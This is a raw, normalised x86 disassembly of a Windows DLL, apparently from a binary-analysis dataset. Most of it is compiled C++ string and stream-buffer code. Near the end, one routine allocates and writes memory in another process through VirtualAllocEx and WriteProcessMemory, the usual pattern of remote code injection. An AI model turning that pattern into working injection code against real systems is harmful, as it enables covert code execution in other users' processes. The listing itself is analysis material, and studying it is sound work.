jae r-xdata
sub eax edi
push eax
push edi
push [ ebp + 0x8 ]
lea esi [ ebp - 0x44 ]
call sub_10009554
mov ecx [ ebp + 0xc ]
push 0xffffffff
xor esi esi
push esi
push eax
mov [ ebp - 0x4 ] esi
call sub_100018cc
push esi
push 0x1
lea ecx [ ebp - 0x44 ]
call sub_1000197b
sub_100092f8
push 0x70
mov eax sub_10027003
call sub_1001427c
mov eax [ ebp + 0x8 ]
mov edi ecx
mov esi [ edi + 0x14 ]
mov [ ebp - 0x38 ] eax
shl esi 0x6
lea eax [ ebp - 0x30 ]
call sub_100047b7
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp [ edi + 0x18 ] 0x10
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x34 ] eax
mov eax [ edi + 0x14 ]
jb r-xdata
add edi 0x4
mov edi [ edi + 0x4 ]
jmp r-xdata
push eax
push edi
lea eax [ ebp - 0x34 ]
call sub_1000d941
cmp eax ebx
je r-xdata
lea ecx [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] 0x10
mov ecx [ ebp - 0x2c ]
jae r-xdata
push [ ebp - 0x34 ]
lea eax [ ebp - 0x30 ]
push ebx
push eax
lea esi [ ebp - 0x54 ]
call sub_10009554
mov ecx [ ebp - 0x38 ]
push 0xffffffff
push ebx
push eax
mov [ ebp - 0x4 ] 0x2
call sub_100018cc
push ebx
push 0x1
mov ecx esi
call sub_1000197b
push ebx
push 0x1
lea ecx [ ebp - 0x30 ]
call sub_1000197b
call sub_100142ff
retn
push r--data
lea ecx [ ebp - 0x54 ]
call sub_100016bc
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x7c ]
push eax
mov [ ebp - 0x4 ] 0x1
call sub_100083d8
push r--data
lea eax [ ebp - 0x7c ]
push eax
call sub_10013de1
sub_100093b7
push 0x80
mov eax sub_10026fcd
call sub_10014213
mov esi [ ebp + 0x10 ]
mov eax [ esi + 0x14 ]
test eax eax
ja r-xdata
mov ecx [ ebp + 0xc ]
push 0xffffffff
push 0x0
push [ ebp + 0x8 ]
call sub_100018cc
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x20 ]
call sub_1000950f
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x28 ]
call sub_1000950f
lea eax [ ebp - 0x18 ]
mov ecx esi
call sub_1000950f
push r--data
lea ecx [ ebp - 0x64 ]
call sub_100016bc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x8c ]
push eax
call sub_100083d8
push r--data
lea eax [ ebp - 0x8c ]
push eax
call sub_10013de1
mov eax [ ebp - 0x1c ]
cmp eax [ esi + 0x4 ]
jne r-xdata
test eax eax
je r-xdata
lea esi [ ebp - 0x28 ]
call sub_100055bf
lea esi [ ebp - 0x18 ]
mov edi eax
call sub_100055bf
lea esi [ ebp - 0x20 ]
mov ebx eax
call sub_100055bf
mov cl [ ebx ]
xor cl [ eax ]
mov [ edi ] cl
call sub_10009d6a
lea esi [ ebp - 0x28 ]
call sub_10009d6a
lea esi [ ebp - 0x18 ]
call sub_10009d6a
mov ecx [ ebp + 0x10 ]
lea eax [ ebp - 0x40 ]
call sub_1000952f
mov esi eax
mov eax [ ebp - 0x18 ]
cmp eax 0xfffffffc
je r-xdata
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x38 ]
call sub_1000952f
mov esi eax
mov eax [ ebp - 0x28 ]
cmp eax 0xfffffffc
je r-xdata
call sub_10010b92
cmp eax [ esi ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ esi + 0x4 ]
jne r-xdata
test eax eax
je r-xdata
mov eax [ ebp - 0x24 ]
cmp eax [ esi + 0x4 ]
je r-xdata
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x30 ]
call sub_1000952f
mov esi eax
mov eax [ ebp - 0x20 ]
cmp eax 0xfffffffc
je r-xdata
mov ecx [ ebp + 0x10 ]
lea eax [ ebp - 0x48 ]
call sub_1000950f
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x14 ] eax
jmp r-xdata
call sub_10010b92
cmp eax [ esi ]
je r-xdata
call sub_100142eb
retn
call sub_10010b92
cmp eax [ esi ]
je r-xdata
sub_1000950f
push ebx
push esi
mov esi ecx
cmp [ esi + 0x18 ] 0x10
push edi
mov edi eax
jb r-xdata
lea ebx [ esi + 0x4 ]
mov ebx [ esi + 0x4 ]
jmp r-xdata
call sub_10006244
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_1000952f
push ebx
push esi
mov esi ecx
cmp [ esi + 0x18 ] 0x10
push edi
mov edi eax
jb r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
mov ebx [ esi + 0x14 ]
add ebx eax
call sub_10006244
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_10009554
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push 0x0
mov ecx esi
mov [ esi + 0x18 ] 0xf
call sub_10001ca7
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100018cc
mov eax esi
leave
retn 0xc
sub_10009582
push 0x10
mov eax sub_1002807f
call sub_10014246
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
xor ebx ebx
push eax
mov [ ebp - 0x14 ] ebx
call sub_10007618
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x18 ] bl
jne r-xdata
push [ ebp + 0x10 ]
mov [ ebp - 0x4 ] 0x1
mov eax [ edi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + edi + 0x28 ]
push [ ebp + 0xc ]
mov eax [ ecx ]
call [ eax + 0x20 ]
cmp eax [ ebp + 0x10 ]
je r-xdata
mov [ ebp - 0x14 ] 0x4
jmp sub_10009609
mov [ ebp - 0x4 ] ebx
jmp sub_10009609
mov [ ebp - 0x14 ] 0x4
sub_100095d9
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov eax [ eax + 0x4 ]
add eax ecx
mov ecx [ eax + 0x8 ]
xor ebx ebx
or ecx 0x4
cmp [ eax + 0x28 ] ebx
jne r-xdata
push 0x1
push eax
call sub_100084c5
mov [ ebp - 0x4 ] ebx
mov eax r-xdata
retn
or ecx 0x4
sub_10009609
mov eax [ edi ]
mov edx [ eax + 0x4 ]
add edx edi
cmp [ ebp - 0x14 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x1c ]
push eax
call sub_100075d2
mov eax edi
call sub_100142eb
retn 0xc
push ebx
push [ ebp - 0x14 ]
call sub_100085e2
sub_10009635
push 0x8
mov eax sub_10027ed6
call sub_10014213
mov esi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ esi ] r--data
mov [ esi + 0x8 ] r--data
mov [ esi + 0x54 ] r--data
mov [ ebp - 0x4 ] ebx
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov [ esi + 0x4 ] ebx
mov ecx [ eax + 0x4 ]
lea edi [ esi + 0xc ]
push edi
add ecx esi
mov [ ebp - 0x10 ] 0x1
call sub_10005380
mov eax [ esi + 0x8 ]
mov eax [ eax + 0x4 ]
mov [ esi + eax + 0x8 ] r--data
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov [ ebp - 0x4 ] 0x5
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edi
mov [ esi + eax ] r--data
call sub_100053eb
mov [ edi ] r--data
mov [ edi + 0x3c ] ebx
mov [ edi + 0x40 ] ebx
mov eax esi
call sub_100142eb
retn 0x4
sub_100096cf
push 0x4
mov eax sub_10026b84
call sub_10014213
mov [ ebp - 0x10 ] ecx
mov eax [ ecx - 0x54 ]
mov eax [ eax + 0x4 ]
mov [ eax + ecx - 0x54 ] r--data
and [ ebp - 0x4 ] 0x0
lea esi [ ecx - 0x48 ]
mov ecx esi
call sub_10009748
mov ecx esi
call sub_1000971d
call sub_100142eb
retn
sub_10009748
push esi
mov esi ecx
test [ esi + 0x40 ] 0x1
mov [ esi ] r--data
je r-xdata
mov ecx [ esi + 0x10 ]
xor eax eax
mov [ ecx ] eax
mov ecx [ esi + 0x20 ]
mov [ ecx ] eax
mov ecx [ esi + 0x30 ]
mov [ ecx ] eax
mov ecx [ esi + 0x14 ]
mov [ ecx ] eax
mov ecx [ esi + 0x24 ]
mov [ ecx ] eax
mov ecx [ esi + 0x34 ]
mov [ ecx ] eax
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] eax
mov ecx esi
pop esi
jmp sub_100080d1
mov eax [ esi + 0x10 ]
push [ eax ]
call sub_10010ba2
pop ecx
sub_10009791
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi ecx
test [ esi + 0x40 ] 0x8
push edi
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ esi + 0x24 ]
mov edi [ ecx ]
test edi edi
je r-xdata
mov edx [ esi + 0x24 ]
mov edi [ edx ]
push ebx
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ esi + 0x3c ]
cmp edi edx
jae r-xdata
test [ esi + 0x40 ] 0x2
jne r-xdata
mov ecx [ esi + 0x34 ]
mov ebx [ ecx ]
mov edx edi
add ebx edx
cmp edx ebx
jae r-xdata
pop edi
pop esi
leave
retn 0x4
mov eax [ esi + 0x34 ]
mov eax [ eax ]
add eax edi
mov [ ecx ] edx
mov ecx [ esi + 0x34 ]
sub eax edx
mov [ ecx ] eax
or eax 0xffffffff
jmp r-xdata
test edi edi
jne r-xdata
dec [ ecx ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
lea edx [ ecx + 0x1 ]
mov [ esi ] edx
jmp r-xdata
pop ebx
mov eax [ esi + 0x34 ]
mov ecx [ esi + 0x10 ]
mov ebx [ eax ]
sub ebx [ ecx ]
add ebx edi
xor ebx ebx
jmp r-xdata
mov [ ecx ] al
test eax eax
jbe r-xdata
push 0x20
pop eax
jmp r-xdata
mov eax ebx
shr eax 0x1
cmp eax 0x20
jae r-xdata
jne r-xdata
mov ecx 0x7fffffff
sub ecx eax
cmp ecx ebx
jae r-xdata
add eax ebx
push 0x0
push eax
mov [ ebp - 0x4 ] eax
call sub_1000241d
mov edi eax
mov eax [ esi + 0x10 ]
mov edx [ eax ]
pop ecx
pop ecx
mov [ ebp - 0x8 ] edx
test ebx ebx
jbe r-xdata
test eax eax
shr eax 0x1
jne r-xdata
jne r-xdata
push ebx
push edx
push [ ebp - 0x4 ]
push edi
call sub_1000102e
mov edx [ ebp - 0x8 ]
add esp 0x10
test ebx ebx
mov ecx [ esi + 0x14 ]
mov eax edi
sub eax edx
add [ esi + 0x3c ] eax
mov eax [ esi + 0x24 ]
mov eax [ eax ]
mov ebx edi
sub eax edx
sub ebx edx
add [ ecx ] ebx
mov ecx [ esi + 0x24 ]
add eax edi
mov [ ecx ] eax
mov ecx edi
sub ecx eax
add ecx [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
mov [ eax ] ecx
test [ esi + 0x40 ] 0x4
je r-xdata
mov eax [ esi + 0x14 ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x3c ] edi
mov [ eax ] edi
mov eax [ esi + 0x24 ]
mov [ eax ] edi
mov eax [ esi + 0x34 ]
mov [ eax ] ecx
mov eax [ esi + 0x10 ]
test [ esi + 0x40 ] 0x4
mov [ eax ] edi
mov eax [ esi + 0x20 ]
jne r-xdata
mov eax [ esi + 0x24 ]
mov ecx [ eax ]
mov eax [ esi + 0x20 ]
mov eax [ eax ]
mov ebx [ esi + 0x10 ]
sub eax edx
add eax edi
mov [ ebx ] edi
mov edi [ esi + 0x20 ]
sub ecx eax
mov [ edi ] eax
mov eax [ esi + 0x30 ]
inc ecx
mov [ eax ] ecx
mov eax [ esi + 0x10 ]
mov [ eax ] edi
mov eax [ esi + 0x20 ]
and [ eax ] 0x0
mov eax [ esi + 0x30 ]
mov [ eax ] edi
jmp r-xdata
mov [ eax ] edi
mov eax [ esi + 0x30 ]
mov [ eax ] 0x1
jmp r-xdata
mov eax [ esi + 0x34 ]
or [ esi + 0x40 ] 0x1
dec [ eax ]
mov esi [ esi + 0x24 ]
mov ecx [ esi ]
lea eax [ ecx + 0x1 ]
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
push edx
call sub_10010ba2
pop ecx
test [ esi + 0x40 ] 0x1
je r-xdata
sub_1000992e
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
or eax 0xffffffff
mov edx [ ecx + 0x10 ]
cmp eax [ edx ]
jbe r-xdata
mov edx [ esp + 0x4 ]
cmp edx 0xffffffff
je r-xdata
mov eax [ ecx + 0x30 ]
inc [ eax ]
mov eax [ ecx + 0x20 ]
dec [ eax ]
cmp edx 0xffffffff
je r-xdata
cmp dl [ eax - 0x1 ]
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
mov [ eax ] dl
mov eax edx
jmp r-xdata
test [ ecx + 0x40 ] 0x2
jne r-xdata
retn 0x4
sub_10009976
mov eax [ ecx + 0x20 ]
push edi
mov edi [ eax ]
test edi edi
jne r-xdata
mov edx [ ecx + 0x30 ]
push ebx
mov ebx [ edx ]
push esi
mov esi edi
add ebx esi
cmp esi ebx
jae r-xdata
or eax 0xffffffff
pop edi
retn
test [ ecx + 0x40 ] 0x4
jne r-xdata
movzx eax [ edi ]
jmp r-xdata
or eax 0xffffffff
mov esi [ ecx + 0x24 ]
mov esi [ esi ]
test esi esi
je r-xdata
pop esi
pop ebx
pop edi
retn
cmp esi edi
ja r-xdata
cmp [ ecx + 0x3c ] esi
jae r-xdata
cmp [ ecx + 0x3c ] edi
jbe r-xdata
mov esi [ eax ]
mov eax [ ecx + 0x3c ]
sub eax esi
mov [ edx ] eax
mov eax [ ecx + 0x20 ]
mov eax [ eax ]
movzx eax [ eax ]
jmp r-xdata
mov [ ecx + 0x3c ] esi
sub_100099d3
push ebp
mov ebp esp
mov edx [ ecx + 0x24 ]
mov eax [ edx ]
test eax eax
je r-xdata
test [ ebp + 0x14 ] 0x1
push ebx
push esi
push edi
je r-xdata
cmp [ ecx + 0x3c ] eax
jae r-xdata
test [ ebp + 0x14 ] 0x2
je r-xdata
mov eax [ ecx + 0x20 ]
mov edi [ eax ]
test edi edi
je r-xdata
mov [ ecx + 0x3c ] eax
mov esi [ r--data ]
mov edx [ edx ]
test edx edx
je r-xdata
cmp [ ebp + 0x10 ] 0x2
mov edx [ r--data ]
jne r-xdata
cmp [ ebp + 0x10 ] 0x2
mov edi [ r--data ]
jne r-xdata
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
mov ebx [ ecx + 0x3c ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x1
jne r-xdata
mov ebx [ ecx + 0x3c ]
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
test [ ebp + 0x14 ] 0x2
jne r-xdata
mov eax [ ecx + 0x10 ]
sub ebx [ eax ]
mov esi [ ebp + 0xc ]
add esi ebx
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
mov esi edi
jne r-xdata
mov ebx edx
mov eax [ ecx + 0x10 ]
sub ebx [ eax ]
mov esi [ ebp + 0xc ]
add esi ebx
jmp r-xdata
mov esi [ ebp + 0xc ]
mov esi edx
jmp r-xdata
mov ebx edi
test esi esi
jl r-xdata
test esi esi
jl r-xdata
mov esi [ ebp + 0xc ]
mov esi edx
jmp r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
cmp esi ebx
jg r-xdata
mov esi edi
jmp r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
cmp esi ebx
jg r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor ecx ecx
mov [ eax ] esi
pop esi
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebx
pop ebp
retn 0x10
mov edx [ ecx + 0x30 ]
sub eax edi
add eax esi
sub [ edx ] eax
mov edx [ ecx + 0x20 ]
add [ edx ] eax
test [ ebp + 0x14 ] 0x2
je r-xdata
sub eax edx
mov edx [ ecx + 0x34 ]
add eax esi
sub [ edx ] eax
mov ecx [ ecx + 0x24 ]
add [ ecx ] eax
jmp r-xdata
mov edx [ ecx + 0x24 ]
mov ebx [ edx ]
test ebx ebx
je r-xdata
mov eax [ ecx + 0x20 ]
mov edi [ eax ]
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
add eax ebx
mov [ edx ] edi
mov ecx [ ecx + 0x34 ]
sub eax edi
mov [ ecx ] eax
jmp r-xdata
sub_10009b0a
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x14 ]
push esi
lea esi [ edx + eax ]
mov eax [ ecx + 0x24 ]
mov edx [ eax ]
push edi
test edx edx
je r-xdata
mov edi [ r--data ]
cmp esi edi
je r-xdata
cmp [ ecx + 0x3c ] edx
jae r-xdata
mov eax [ ebp + 0x8 ]
xor ecx ecx
pop edi
mov [ eax ] esi
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop esi
pop ebp
retn 0x20
test [ ebp + 0x24 ] 0x1
push ebx
je r-xdata
mov [ ecx + 0x3c ] edx
test [ ebp + 0x24 ] 0x2
je r-xdata
mov edx [ ecx + 0x20 ]
mov edx [ edx ]
test edx edx
je r-xdata
mov esi edi
mov edx [ eax ]
test edx edx
je r-xdata
test esi esi
jl r-xdata
test esi esi
jl r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
cmp esi ebx
jg r-xdata
mov eax [ ecx + 0x10 ]
mov eax [ eax ]
mov ebx [ ecx + 0x3c ]
sub ebx eax
cmp esi ebx
jg r-xdata
sub eax edx
mov edx [ ecx + 0x30 ]
add eax esi
sub [ edx ] eax
mov edx [ ecx + 0x20 ]
add [ edx ] eax
test [ ebp + 0x24 ] 0x2
je r-xdata
sub eax edx
mov edx [ ecx + 0x34 ]
add eax esi
sub [ edx ] eax
mov ecx [ ecx + 0x24 ]
add [ ecx ] eax
jmp r-xdata
pop ebx
mov edx [ ecx + 0x24 ]
mov ebx [ edx ]
test ebx ebx
je r-xdata
mov eax [ ecx + 0x20 ]
mov edi [ eax ]
mov eax [ ecx + 0x34 ]
mov eax [ eax ]
add eax ebx
mov [ edx ] edi
mov ecx [ ecx + 0x34 ]
sub eax edi
mov [ ecx ] eax
jmp r-xdata
sub_10009bf3
push esi
push edi
lea edi [ ecx - 0xc ]
lea esi [ edi + 0xc ]
mov ecx esi
call sub_1000971d
push esi
mov [ esi ] r--data
call sub_1000fec1
test [ esp + 0x10 ] 0x1
pop ecx
je r-xdata
mov eax edi
pop edi
pop esi
retn 0x4
push edi
call sub_10010ba2
pop ecx
sub_10009c40
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x10 ] 0x0
mov ecx [ ebp + 0x8 ]
jne r-xdata
push ebx
push esi
mov esi [ ecx + 0x14 ]
push edi
cmp eax esi
jae r-xdata
cmp eax [ ecx + 0x14 ]
jbe r-xdata
or eax 0xffffffff
sub esi eax
cmp [ ebp + 0x10 ] esi
ja r-xdata
leave
retn 0xc
xor edx edx
inc edx
sub edx [ ebp + 0x10 ]
add esi edx
cmp [ ecx + 0x18 ] 0x10
jb r-xdata
add ecx 0x4
mov [ ebp - 0x4 ] ecx
add ecx 0x4
mov [ ebp - 0x4 ] ecx
mov ecx [ ecx ]
jmp r-xdata
mov eax [ ebp + 0xc ]
movsx eax [ eax ]
push esi
push eax
push ebx
call sub_10011b30
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
lea ebx [ ecx + eax ]
jmp r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_10011cbf
add esp 0xc
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
sub ebx edi
lea esi [ esi + ebx - 0x1 ]
lea ebx [ edi + 0x1 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov eax edi
sub eax ecx
jmp r-xdata
sub_10009cdc
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ eax + 0x14 ]
push ebx
push esi
push edi
test ecx ecx
jbe r-xdata
or eax 0xffffffff
cmp ecx 0x1
jb r-xdata
mov [ ebp - 0x4 ] ecx
mov ecx [ eax + 0x18 ]
mov [ ebp - 0x8 ] ecx
lea edi [ eax + 0x4 ]
cmp ecx 0x8
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
xor esi esi
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
mov ebx eax
mov ecx [ ebp + 0x8 ]
xor edx edx
inc edx
mov eax esi
call sub_10007556
test eax eax
je r-xdata
test esi esi
je r-xdata
inc esi
inc esi
dec ecx
jne r-xdata
cmp [ ebp - 0x8 ] 0x8
jb r-xdata
mov eax esi
sub eax ebx
sar eax 0x1
or ecx 0xffffffff
sub ecx eax
add [ ebp - 0x4 ] ecx
lea ebx [ esi + 0x2 ]
jmp r-xdata
cmp [ esi ] ax
je r-xdata
mov ecx edi
mov ecx [ edi ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov esi ebx
test ecx ecx
jbe r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
mov eax esi
sub eax ecx
sar eax 0x1
jmp r-xdata
sub_10009d6a
mov eax [ esi ]
cmp eax 0xfffffffc
je r-xdata
inc [ esi + 0x4 ]
mov eax esi
retn
test eax eax
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
call sub_10010b92
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
call sub_10010b92
mov eax [ eax + 0x14 ]
add eax ecx
cmp [ esi + 0x4 ] eax
jb r-xdata
sub_10009d9f
push 0x40
mov eax sub_10026fa0
call sub_1001427c
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x40 ]
xor edi edi
mov [ ebp - 0x4c ] edi
test dl 0x2
jne r-xdata
test dl 0x4
jne r-xdata
mov ecx [ eax + 0x24 ]
cmp [ ecx ] edi
je r-xdata
push edi
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x30 ] 0xf
call sub_10001ca7
lea eax [ ebp - 0x48 ]
push eax
mov ecx ebx
mov [ ebp - 0x4 ] 0x2
call sub_100016de
lea ecx [ ebp - 0x48 ]
mov edx [ eax + 0x20 ]
cmp [ edx ] edi
je r-xdata
mov ecx [ ecx ]
mov edx [ eax + 0x3c ]
cmp edx ecx
jb r-xdata
mov ecx [ eax + 0x30 ]
mov ecx [ ecx ]
mov eax [ eax + 0x10 ]
add ecx [ edx ]
mov eax [ eax ]
sub ecx eax
push ecx
push eax
lea esi [ ebp - 0x2c ]
call sub_10009e62
xor esi esi
lea eax [ ebp - 0x2c ]
inc esi
push eax
mov ecx ebx
mov [ ebp - 0x4 ] esi
call sub_100016de
push edi
push esi
lea ecx [ ebp - 0x2c ]
jmp r-xdata
mov eax [ eax + 0x14 ]
mov eax [ eax ]
sub ecx eax
push ecx
push eax
lea esi [ ebp - 0x2c ]
call sub_10009e62
mov eax esi
push eax
mov ecx ebx
mov [ ebp - 0x4 ] edi
call sub_100016de
mov ecx esi
jmp r-xdata
mov ecx edx
call sub_1000197b
mov eax ebx
call sub_100142ff
retn 0x4
push edi
push 0x1
sub_10009e86
push ebx
push ebp
push esi
push edi
mov ebx r--data
push ebx
mov esi eax
call sub_10010990
mov edi [ esi + 0x14 ]
mov ebp eax
pop ecx
mov eax edi
cmp edi ebp
jb r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov eax ebp
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
pop edi
xor ecx ecx
test eax eax
pop esi
setne cl
pop ebp
mov al cl
pop ebx
retn
cmp edi ebp
jae r-xdata
push eax
push ebx
push esi
call sub_10011cbf
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
cmp edi ebp
setne al
or eax 0xffffffff
jmp r-xdata
sub_10009ee0
push esi
lea esi [ ecx - 0x8 ]
lea eax [ esi + 0x8 ]
mov ecx [ eax - 0x8 ]
mov ecx [ ecx + 0x4 ]
mov [ ecx + eax - 0x8 ] r--data
push eax
mov [ eax ] r--data
call sub_1000fec1
test [ esp + 0xc ] 0x1
pop ecx
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_10010ba2
pop ecx
sub_10009f41
push 0x4
mov eax sub_10027aa0
call sub_10014213
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0x18 ]
call sub_1000c966
mov ecx esi
mov [ esi ] r--data
call sub_1000bd6b
call sub_100142eb
retn
sub_10009f7d
push esi
push edi
lea edi [ ecx - 0xc4 ]
lea esi [ edi + 0xc4 ]
mov ecx esi
call sub_10009fad
test [ esp + 0xc ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax edi
pop edi
pop esi
retn 0x4
push edi
call sub_10010ba2
pop ecx
sub_10009fad
lea eax [ ecx - 0xc4 ]
mov edx [ eax ]
mov edx [ edx + 0x4 ]
mov [ edx + ecx - 0xc4 ] r--data
mov eax [ eax ]
mov eax [ eax + 0x4 ]
push edi
lea edx [ eax - 0xc4 ]
lea edi [ ecx - 0xc0 ]
mov [ eax + ecx - 0xc8 ] edx
call sub_100014cd
pop edi
retn
sub_10009fe5
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10028594
mov eax [ fs : 0x0 ]
push eax
sub esp 0x9c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x94 ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xa8 ]
mov [ fs : 0x0 ] eax
mov eax ecx
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
lea ecx [ eax - 0xc0 ]
lea eax [ esp + 0xc ]
push eax
call sub_10008b90
and [ esp + 0xb0 ] 0x0
push edi
push esi
lea ecx [ esp + 0x14 ]
call sub_10008c77
lea ecx [ esp + 0xc ]
call sub_10008c2a
mov ecx [ esp + 0xa8 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x94 ]
xor ecx esp
call sub_10010789
mov esp ebp
pop ebp
retn 0x8
sub_1000a0b1
push 0x78
mov eax sub_10027a7a
call sub_10014213
mov esi ecx
xor ebx ebx
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov eax [ esi + 0x14 ]
push 0x4
push 0x1000
lea edi [ eax + eax ]
push edi
push ebx
push [ ebp + 0x8 ]
call [ VirtualAllocEx@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
push r--data
lea ecx [ ebp - 0x5c ]
call sub_100016bc
mov [ ebp - 0x4 ] ebx
and [ ebp - 0x10 ] 0x0
cmp [ esi + 0x18 ] 0x8
jb r-xdata
push r--data
lea ecx [ ebp - 0x5c ]
call sub_100016bc
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea eax [ ebp - 0x5c ]
push eax
lea eax [ ebp - 0x84 ]
push eax
call sub_100083d8
push r--data
lea eax [ ebp - 0x84 ]
push eax
call sub_10013de1
cmp [ ebp - 0x10 ] edi
je r-xdata
push r--data
lea ecx [ ebp - 0x5c ]
call sub_100016bc
mov [ ebp - 0x4 ] 0x2
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edi
push esi
push ebx
push [ ebp + 0x8 ]
call [ WriteProcessMemory@IAT ]
cmp eax 0x1
je r-xdata
lea edi [ ebp - 0x18 ]
call sub_1000a490
push r--data
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] 0x4
call sub_100016bc
lea eax [ ebp - 0x40 ]
push eax
mov eax edi
push eax
mov [ ebp - 0x4 ] 0x5
call sub_1000a5c7
push 0x0
push 0x1
lea ecx [ ebp - 0x40 ]
mov esi eax
mov [ ebp - 0x4 ] 0x4
call sub_1000197b
push ebx
push esi
push [ ebp + 0x8 ]
lea edi [ ebp - 0x24 ]
call sub_1000c9d2
mov eax edi
push eax
mov [ ebp - 0x4 ] 0x6
call sub_1000a3ac
mov ecx edi
mov [ ebp - 0x24 ] r--data
call sub_1000bd6b
call sub_100142eb
retn 0x4
push r--data
lea ecx [ ebp - 0x5c ]
call sub_100016bc
mov [ ebp - 0x4 ] 0x3
jmp r-xdata
sub_1000a1f6
push 0x30
mov eax sub_1002805a
call sub_10014213
mov [ ebp - 0x18 ] r--data
call sub_1000a537
mov [ ebp - 0x14 ] eax
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x18 ]
call sub_1000a6cf
mov esi eax
push [ ebp + 0x8 ]
lea ebx [ ebp - 0x20 ]
mov [ ebp - 0x4 ] 0x1
call sub_1000ca52
pop ecx
mov [ ebp - 0x4 ] 0x2
mov eax [ ebp - 0x20 ]
push [ eax + 0x4 ]
mov ecx esi
call sub_1000a0b1
lea eax [ ebp - 0x1c ]
mov [ ebp - 0x4 ] 0x1
call sub_1000863f
push 0x0
push 0x1
